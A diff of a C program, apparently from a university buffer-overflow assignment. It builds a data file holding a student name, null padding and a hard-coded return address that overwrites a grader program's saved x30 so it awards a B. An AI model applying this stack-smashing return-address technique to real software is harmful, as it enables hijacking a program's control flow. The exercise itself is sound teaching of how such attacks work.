@@ -1,44 +1,49 @@
 /*
- * createdataB.c
- * Purpose: Produces a file called dataB with the student name, a 
- * nullbyte, padding to overrun the stack, and the address of the 
- * instruction in main to get a B, the latter of which will overwrite 
- * getName's stored x30.
+ * createdataB.c 
+ * Produces a file called dataB with the student name, a nullbyte,
+ * padding to overrun the stack, and the address of the instruction
+ * in main to get a B, the latter of which will overwrite getName's
+ * stored x30
  */
 
 #include <stdio.h>
 #include <stdlib.h>
 
+/*
+ * This main function takes no command-line arguments and does not 
+ * read from stdin. It writes a sequence of bytes (student name, 
+ * null-padding, and a return address) to the "dataB" file.
+ * On success, the main writes nothing to stdout. 
+ * On failure, the main prints an error message to stderr and returns
+ * 1.
+ */
 int main(void) {
     int i;
 
-    /* Student name for the grader output */
-    char name[] = "Emily Qian";
+    /* student name for the grader output */
+    char name[] = "Shin Qian";
 
-    /* The address to overwrite the return pointer (example: grade = "B") */
+    /* address to overwrite return pointer */
     const unsigned int returnAddress = 0x400890;
 
-    /* Open the file "dataB" for writing */
+    /* open file and write name */
     FILE *psFile = fopen("dataB", "wb");
     if (psFile == NULL) {
         perror("Error opening file"); 
-        return 1;  /* Return error code if file opening fails */
+        return 1; 
     }
-
-    /* Step 1: Write the name */
     fwrite(name, sizeof(char), sizeof(name) - 1, psFile);
 
-    /* Step 2: Add null bytes to fill the buffer and 
-    reach the saved return address */
-    for (i = 0; i < 38; i++) {
-        fputc(0x00, psFile);  /* Write 38 null bytes to pad the buffer */
+    /* write null bytes to fill buffer and reach return address. 
+    Number of bytes is 48 - 9 = 39. */
+    for (i = 0; i < 39; i++) {
+        fputc(0x00, psFile); 
     }
 
-    /* Step 3: Overwrite the return address */
+    /* overwrite return address */
     fwrite(&returnAddress, sizeof(unsigned int), 1, psFile);
 
-    /* Close the file */
+    /* close file and return 0 */
     fclose(psFile);
-
     return 0;
 }
